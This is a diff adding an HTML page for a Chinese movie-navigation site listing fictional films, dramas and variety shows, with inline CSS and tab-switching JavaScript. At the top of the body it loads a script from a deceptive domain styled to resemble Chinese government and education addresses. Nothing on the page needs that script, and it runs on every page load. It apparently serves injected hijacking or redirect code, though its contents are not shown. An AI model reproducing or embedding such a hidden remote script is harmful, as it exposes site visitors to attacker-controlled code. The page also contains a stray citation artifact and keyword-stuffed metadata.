@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>雪箭电影网 - 寒锋电影/极地剧集/破冰综艺在线导航</title>
+<meta name="description" content="雪箭电影网(xuejiandianyingwang-h5.github.io)整理寒锋电影、极地剧集、破冰综艺片单，移动端自适应，影视信息导航站。">
+<meta name="keywords" content="雪箭电影网,寒锋电影,极地剧集,破冰综艺,在线观看,影视导航">
+<meta name="author" content="雪箭电影网">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="雪箭电影网 - 极地影视导航">
+<meta property="og:description" content="雪箭电影网整理寒锋电影、极地剧集、破冰综艺片单。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://xuejiandianyingwang-h5.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{font-size:16px;scroll-behavior:smooth}
+body{font-family:'PingFang SC','Microsoft YaHei',sans-serif;background:#06121f;color:#e7f6ff;line-height:1.7;overflow-x:hidden}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+
+/* 寒温顶栏 */
+.frost-bar{position:sticky;top:0;z-index:999;background:rgba(6,18,31,.95);border-bottom:1px solid #163b54;padding:.6rem .9rem}
+.frost-top{display:flex;align-items:center;justify-content:space-between}
+.brand{font-size:1.08rem;font-weight:900;letter-spacing:.5px}
+.brand b{color:#7fe9ff;text-shadow:0 0 10px rgba(127,233,255,.55)}
+.brand i{color:#bfeaff;font-style:normal}
+.temp{font-size:.7rem;color:#bfeaff}
+.temp b{color:#7fe9ff}
+.thermo{height:3px;background:#163b54;border-radius:3px;margin-top:.5rem;overflow:hidden}
+.thermo i{display:block;height:100%;width:18%;background:linear-gradient(90deg,#7fe9ff,#d7f7ff);border-radius:3px;transition:.3s}
+.chips{display:flex;gap:.35rem;margin-top:.55rem;overflow-x:auto}
+.chips a{font-size:.74rem;padding:.32rem .72rem;white-space:nowrap;border-radius:14px 14px 4px 4px;border:1px solid #163b54;color:#9fd4ec;transition:.25s}
+.chips a.active,.chips a:hover{background:linear-gradient(135deg,#7fe9ff,#3aa7d8);color:#06121f;font-weight:700;border-color:transparent}
+
+.wrap{padding:1rem;max-width:1080px;margin:0 auto}
+.zone{display:none;animation:shoot .4s ease}
+.zone.active{display:block}
+@keyframes shoot{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
+.zone h2{font-size:1.22rem;color:#7fe9ff;margin:0 0 1rem;padding-left:.5rem;border-left:4px solid #bfeaff}
+
+/* 首页 */
+#home .launch{background:radial-gradient(120% 130% at 82% -12%,#103247,#06121f 62%);border:1px solid #163b54;border-radius:18px;padding:1.6rem;margin-bottom:1rem;position:relative;overflow:hidden}
+#home .launch:before{content:"❄️";position:absolute;right:-8px;top:-12px;font-size:6rem;opacity:.1}
+#home .launch h1{font-size:1.7rem;color:#7fe9ff;margin-bottom:.4rem}
+#home .launch h1 span{color:#bfeaff}
+#home .launch p{font-size:.86rem;color:#9fd4ec}
+.frost-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:.7rem;margin-top:1rem}
+.frost-stats div{background:#0b2233;border:1px solid #163b54;border-radius:12px;padding:.9rem;text-align:center}
+.frost-stats h3{color:#7fe9ff;font-size:1.05rem}
+.frost-stats p{font-size:.68rem;color:#6fa6c2}
+
+/* 箭簇卡片 */
+.arrow-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(158px,1fr));gap:.85rem}
+.arrow{background:#0b2233;border:1px solid #163b54;border-radius:14px;overflow:hidden;position:relative;transition:.25s;clip-path:polygon(0 0,100% 0,100% 82%,92% 100%,0 100%)}
+.arrow:hover{transform:translateY(-4px);box-shadow:0 10px 24px rgba(127,233,255,.2);border-color:#7fe9ff}
+.arrow .feather{height:108px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:.78rem;color:#06121f}
+.arrow .ice{background:linear-gradient(135deg,#7fe9ff,#3aa7d8)}
+.arrow .snow{background:linear-gradient(135deg,#d7f7ff,#9fd4ec)}
+.arrow .deep{background:linear-gradient(135deg,#163b54,#0b2233);color:#e7f6ff}
+.arrow .body{padding:.6rem}
+.arrow h3{font-size:.84rem;color:#f1fbff;margin-bottom:.15rem}
+.arrow span{font-size:.68rem;color:#6fa6c2}
+.arrow .tip{position:absolute;top:6px;right:6px;background:#06121fcc;color:#7fe9ff;font-size:.6rem;padding:.15rem .4rem;border-radius:5px;font-weight:700}
+
+/* 剧集时间轴 */
+.ice-line{display:flex;flex-direction:column;gap:.8rem}
+.ice-item{display:flex;gap:.8rem;background:#0b2233;border:1px solid #163b54;border-left:4px solid #7fe9ff;border-radius:12px;padding:.9rem}
+.ice-item .flake{width:38px;height:38px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#7fe9ff,#163b54);font-size:1rem}
+.ice-item h3{font-size:.92rem;color:#f1fbff;margin-bottom:.2rem}
+.ice-item p{font-size:.74rem;color:#9fd4ec}
+.ice-item .eps span{display:inline-block;background:#163b54;color:#7fe9ff;font-size:.66rem;padding:.18rem .5rem;border-radius:6px;margin:.25rem .25rem 0 0}
+
+/* 综艺横滑 */
+.break-reel{display:flex;gap:.6rem;overflow-x:auto;padding-bottom:.4rem}
+.break-reel::-webkit-scrollbar{height:5px}.break-reel::-webkit-scrollbar-thumb{background:#163b54;border-radius:5px}
+.break{min-width:158px;background:#0b2233;border:1px solid #163b54;border-radius:12px;padding:.9rem;text-align:center}
+.break .e{font-size:1.5rem}
+.break h3{font-size:.84rem;color:#7fe9ff;margin:.3rem 0 .15rem}
+.break p{font-size:.7rem;color:#6fa6c2}
+
+/* 关于 */
+.about-frost{background:radial-gradient(120% 120% at 18% 0%,#103247,#06121f);border:1px solid #7fe9ff;border-radius:18px;padding:1.5rem}
+.about-frost h2{color:#7fe9ff;border:0;padding:0;margin-bottom:.8rem}
+.about-frost p{font-size:.85rem;color:#9fd4ec;margin-bottom:.6rem}
+.about-frost .info{margin-top:1rem;background:#0b2233;border:1px dashed #bfeaff;border-radius:12px;padding:1rem}
+.about-frost .info h3{color:#bfeaff;margin-bottom:.4rem}
+.about-frost .info p{font-size:.78rem;color:#6fa6c2}
+
+.foot{text-align:center;padding:1.4rem 1rem;border-top:1px solid #163b54;margin-top:1.6rem;font-size:.72rem;color:#3f6c86}
+@media(max-width:768px){.frost-stats{grid-template-columns:1fr}.arrow-grid{grid-template-columns:repeat(2,1fr)}.brand{font-size:.95rem}#home .launch h1{font-size:1.38rem}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="frost-bar">
+  <div class="frost-top">
+    <div class="brand">雪箭<b>电影网</b> <i>❄️</i></div>
+    <div class="temp">寒温 <b>-23℃</b> · 发射就绪</div>
+  </div>
+  <div class="thermo"><i id="heat"></i></div>
+  <nav class="chips">
+    <a href="#" class="chip active" data-z="home">雪原首页</a>
+    <a href="#" class="chip" data-z="movie">寒锋电影</a>
+    <a href="#" class="chip" data-z="drama">极地剧集</a>
+    <a href="#" class="chip" data-z="show">破冰综艺</a>
+    <a href="#" class="chip" data-z="about">关于</a>
+  </nav>
+</header>
+
+<main class="wrap">
+
+  <section id="home" class="zone active">
+    <div class="launch">
+      <h1>雪箭<span>电影网</span></h1>
+      <p>像极地发射井一样找片：寒锋电影、极地剧集、破冰综艺，一片接一片射进片单。</p>
+      <div class="frost-stats">
+        <div><h3>寒锋</h3><p>动作 / 极地 / 悬疑</p></div>
+        <div><h3>连映</h3><p>剧集更新不冻屏</p></div>
+        <div><h3>破冰</h3><p>综艺 / 生存 / 竞速</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="movie" class="zone">
+    <h2>🏹 寒锋电影 · 箭簇片单</h2>
+    <div class="arrow-grid">
+      <div class="arrow"><div class="tip">首映</div><div class="feather ice">极地</div><div class="body"><h3>零下突围</h3><span>动作 / 2026</span></div></div>
+      <div class="arrow"><div class="tip">4K</div><div class="feather snow">悬疑</div><div class="body"><h3>雪盲证词</h3><span>悬疑 / 心理</span></div></div>
+      <div class="arrow"><div class="tip">新片</div><div class="feather deep">科幻</div><div class="body"><h3>冰盖之下</h3><span>科幻 / 末世</span></div></div>
+      <div class="arrow"><div class="tip">HD</div><div class="feather ice">战争</div><div class="body"><h3>白原防线</h3><span>战争 / 历史</span></div></div>
+      <div class="arrow"><div class="tip">热推</div><div class="feather snow">冒险</div><div class="body"><h3>寒流航线</h3><span>冒险 / 救援</span></div></div>
+      <div class="arrow"><div class="tip">经典</div><div class="feather deep">纪录</div><div class="body"><h3>最后一座冰站</h3><span>纪录 / 自然</span></div></div>
+    </div>
+  </section>
+
+  <section id="drama" class="zone">
+    <h2>🧊 极地剧集 · 寒流时间轴</h2>
+    <div class="ice-line">
+      <div class="ice-item"><div class="flake">🌨️</div><div><h3>北纬78°派出所</h3><p>极夜里的边境小站，每起报案都和冰、鱼、旧船有关。</p><div class="eps"><span>第1集</span><span>第2集</span><span>第3集</span><span>第4集</span></div></div></div>
+      <div class="ice-item"><div class="flake">🛷</div><div><h3>雪原调度台</h3><p>暴风雪封路，三个调度员用老电台决定车队生死。</p><div class="eps"><span>第1集</span><span>第2集</span><span>第3集</span></div></div></div>
+      <div class="ice-item"><div class="flake">🐺</div><div><h3>冰原守望者</h3><p>科考队离开后，留下的人开始收到不存在的无线电呼号。</p><div class="eps"><span>第1集</span><span>第2集</span><span>第3集</span><span>第4集</span><span>第5集</span></div></div></div>
+    </div>
+  </section>
+
+  <section id="show" class="zone">
+    <h2>🧭 破冰综艺 · 横滑冰带</h2>
+    <div class="break-reel">
+      <div class="break"><div class="e">🏔️</div><h3>极地72小时</h3><p>自带装备求生</p></div>
+      <div class="break"><div class="e">⛏️</div><h3>破冰工程队</h3><p>真实冰下作业</p></div>
+      <div class="break"><div class="e">🎿</div><h3>雪道竞速赛</h3><p>野雪大回转</p></div>
+      <div class="break"><div class="e">🔥</div><h3>寒夜篝火谈</h3><p>极地版圆桌派</p></div>
+      <div class="break"><div class="e">🐧</div><h3>南极观察员</h3><p>真实科考日常</p></div>
+    </div>
+  </section>
+
+  <section id="about" class="zone">
+    <div class="about-frost">
+      <h2>关于 雪箭电影网</h2>
+      <p>雪箭电影网是一个“极地影视导航站”，整理寒锋电影、极地剧集、破冰综艺的片单与分类浏览。</p>
+      <p>页面采用单文件 H5 结构，CSS/JS 全部内联，手机、平板、电脑一套代码自适应；标题、栏目、片单文字直接写在 HTML 里，方便必应等搜索引擎抓取。[14](@ref)</p>
+      <p>本站仅做影视信息展示与分类导航，不提供盗版资源，也不生成 robots.txt / sitemap.xml。</p>
+      <div class="info">
+        <h3>站点信息</h3>
+        <p>网站名称：雪箭电影网</p>
+        <p>网址：https://xuejiandianyingwang-h5.github.io</p>
+        <p>关键词：雪箭电影网、寒锋电影、极地剧集、破冰综艺、在线观看</p>
+      </div>
+    </div>
+  </section>
+
+  <footer class="foot">
+    <p>© 2024 雪箭电影网 | https://xuejiandianyingwang-h5.github.io</p>
+    <p>本网站仅提供影视信息展示与分类导航，所有资源来自互联网，如有侵权请联系删除。</p>
+  </footer>
+</main>
+
+<script>
+var chips=document.querySelectorAll('.chip');
+chips.forEach(function(c){
+  c.addEventListener('click',function(e){
+    e.preventDefault();
+    var z=this.dataset.z;
+    document.querySelectorAll('.zone').forEach(function(x){x.classList.remove('active')});
+    document.getElementById(z).classList.add('active');
+    chips.forEach(function(x){x.classList.remove('active')});
+    this.classList.add('active');
+    var n=Array.from(chips).indexOf(this)+1;
+    document.getElementById('heat').style.width=(n/chips.length*100)+'%';
+    window.scrollTo({top:0,behavior:'smooth'});
+  });
+});
+document.getElementById('heat').style.width='20%';
+</script>
+</body>
+</html>
